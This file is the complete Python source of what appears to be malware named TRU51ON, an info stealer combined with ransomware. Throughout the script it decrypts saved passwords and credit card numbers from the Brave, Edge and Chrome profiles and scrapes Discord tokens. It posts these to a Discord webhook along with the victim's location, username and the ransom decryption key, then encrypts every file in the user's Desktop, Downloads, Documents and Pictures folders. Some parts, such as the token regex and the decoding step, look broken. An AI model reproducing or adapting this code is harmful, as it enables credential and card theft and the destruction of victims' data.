# Import modules
import os
from re import findall
import time
from shutil import copy
import requests
import json
import sqlite3
from cryptography.fernet import Fernet
import pycountry
import getpass
import win32com.client
import base64
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

# Settings
webhook = ''
max_embeds = 11
send_timeout = 1

# Generate the decryption key and save it to antidote.key
key = Fernet.generate_key()

## Info stealer ##
# Get default info
response = requests.get('https://ipinfo.io')
data = response.json()
country_code = data['country'].lower()
country = pycountry.countries.get(alpha_2=country_code.upper())

username = getpass.getuser()
try:
    wmi = win32com.client.GetObject("winmgmts:")
    user = wmi.ExecQuery("Select * from Win32_UserAccount where Name='{0}'".format(username))
    display_name = user[0].FullName
except Exception as e:
    display_name = "Unknown"

# Password decryption algorithm
def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
        
def get_discord_token():
    tokens = []
    cleaned = []
    checker = []
    already_check = []

    
    path = os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb')
    for file in os.listdir(path):
        print(file)
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue
        else:
            try:
                with open(file, 'r', errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            tokens.append(values)
            except:
                continue
    for token in tokens:
        print(token)
        try:
            tok = base64.b64decode(token.split('dQw4w9WgXcQ:')[1], base64.b64decode(key)[5:])
        except IndexError:
            continue
        checker.append(tok)

        for value in checker:
            print(value)
            if value not in already_check:
                already_check.append(value)
                headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                try:
                    res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    if res.status_code == 200:
                        cleaned.append(value)
                except:
                    continue
# Get the browser data
class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.appdataroaming = os.getenv('APPDATA')
        self.browsers = {
            'brave': os.path.join(self.appdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'edge': os.path.join(self.appdata, 'Microsoft', 'Edge', 'User Data'),
            'chrome': os.path.join(self.appdata, 'Google', 'Chrome', 'User Data'),
        }

        self.profiles = (
            'Default',
            'Profile 1',
            'Profile 2'
        )
    
    # Get the credit cards
    def get_credit_cards(self):
        decrypted_creditcards = []
        for _, path in self.browsers.items():
            if os.path.exists(path):
                masterkey_path = os.path.join(path, 'Local State')
                with open(masterkey_path , "r", encoding="utf-8") as f:
                    raw_keydata = f.read()
                    raw_keydata = json.loads(raw_keydata)
                master_key = base64.b64decode(raw_keydata['os_crypt']['encrypted_key'])
                master_key = master_key[5:]
                if not master_key:
                    continue
                master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                for profile in self.profiles:
                    profile_path = os.path.join(path, profile)
                    if os.path.exists(profile_path):
                        cc_db_original_file = os.path.join(profile_path, 'Web Data')
                        cc_db_file = os.path.join(profile_path, 'Web Data.db')    
                        copy(cc_db_original_file, cc_db_file)   
                        conn = sqlite3.connect(cc_db_file)
                        cursor = conn.cursor()
                        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards')
                        for row in cursor.fetchall():
                            name_on_card = row[0]
                            expiration_month = row[1]
                            expiration_year = row[2]
                            encrypted_card_number = row[3]

                            # Decrypt the credit card number
                            if encrypted_card_number:
                                decrypted_card_number = decrypt_password(encrypted_card_number, master_key)
                            else:
                                decrypted_card_number = "N/A"
                            decrypted_creditcards.append((name_on_card, expiration_month, expiration_year, decrypted_card_number))
                        conn.close()
        return decrypted_creditcards

    def get_passwords(self): 
        decrypted_passwords = []
        for _, path in self.browsers.items():
            if os.path.exists(path):
                masterkey_path = os.path.join(path, 'Local State')
                with open(masterkey_path , "r", encoding="utf-8") as f:
                    raw_keydata = f.read()
                    raw_keydata = json.loads(raw_keydata)
                master_key = base64.b64decode(raw_keydata['os_crypt']['encrypted_key'])
                master_key = master_key[5:]
                if not master_key:
                    continue
                master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                for profile in self.profiles:
                    profile_path = os.path.join(path, profile)
                    if os.path.exists(profile_path):
                        login_db_original_file = os.path.join(profile_path, 'Login Data')
                        login_db_file = os.path.join(profile_path, 'Login Data.db')    
                        copy(login_db_original_file, login_db_file)   
                        conn = sqlite3.connect(login_db_file)
                        cursor = conn.cursor()
                        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                        for row in cursor.fetchall():
                            action_url = row[0]
                            username = row[1]
                            encrypted_password = row[2]

                            # Decrypt the password
                            if encrypted_password:
                                decrypted_password = decrypt_password(encrypted_password, master_key)
                            else:
                                decrypted_password = "N/A"  # Placeholder if password is empty

                            decrypted_passwords.append((action_url, username, decrypted_password))
                        conn.close()
        return decrypted_passwords

    
browser_instance = Browsers()
all_browser_cards = browser_instance.get_credit_cards()
all_browser_passwords = browser_instance.get_passwords()
all_discord_token = get_discord_token()

data = {
    "username" : "Karin van de administratie"
}

data["embeds"] = []

data["embeds"].append({
    "title" : "TRU51ON victim: ",
    "color": "14177041"
})

# Adding fields
fields = [
    {
        "name": ":pushpin: Country",
        "value": f"Hi, from :flag_{country_code}:"
    },
    {
        "name": ":old_man: **About me**",
        "value": f"```Country: {country.name}\nDisplay name: {display_name}\nUsername: {username}```",
    },
    {
        "name": ":lock: **Ransomware**",
        "value": f"```Decryption key:\n{key}```",
    },
    {
        "name": ":robot: Botnet attendant token:",
        "value": f"```Discord token:\n{all_discord_token}```",
    },
]

for row in all_browser_cards:
    if row[0]:
        fields.append({
            "name": f":credit_card: **{row[0]}**",
            "value": f"```Card number: {row[3]}\nExpiration: {row[1]}/{row[2]}\n\n```",
        })

for row in all_browser_passwords:
    if row[0]:
        fields.append({
            "name": f":globe_with_meridians: **{row[0]}**",
            "value": f"```Username: {row[1]}\nPassword: {row[2]}\n\n```",
        })

if len(fields) > max_embeds:
    num_chunks = (len(fields) + max_embeds - 1) // max_embeds
    for i in range(num_chunks):
        chunk_start = i * max_embeds
        chunk_end = (i + 1) * max_embeds
        chunk_fields = fields[chunk_start:chunk_end]
        data["embeds"][0]["fields"] = chunk_fields
        result = requests.post(webhook, json=data)
        try:
            result.raise_for_status()
        except requests.exceptions.HTTPError as err:
            print(err)
        else:
            print("Payload delivered successfully, code {}.".format(result.status_code))
    time.sleep(send_timeout)

else:
    data["embeds"][0]["fields"] = fields

    # Send the data to the webhook
    result = requests.post(webhook, json=data)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))


## Ransomware ##
# Get the paths for Desktop, Downloads, Documents and Pictures
userprofile = os.environ.get("USERPROFILE")
desktop = os.path.join(userprofile, "Desktop")
downloads = os.path.join(userprofile, "Downloads")
documents = os.path.join(userprofile, "Documents")
pictures = os.path.join(userprofile, "Pictures")

# List of directories to search
directories = [desktop, downloads, documents, pictures]

# List all files in the current directory except for TRU51ON.py and antidote.key
files = []
for directory in directories:
    for file in os.listdir(directory):
        if os.path.isfile(os.path.join(directory, file)):
            if file == "TRU51ON.py" or file == 'antidote.key':
                continue
            else:
                files.append(os.path.join(directory, file))

# Encrypt the files one by one
for file in files:
    try:
        with open(file, 'rb') as f:
            content = f.read()
        content_encrypted = Fernet(key).encrypt(content)
        with open(file, 'wb') as f:
            f.write(content_encrypted)
        os.rename(file, file + '.TRU51ON')
    except:
        pass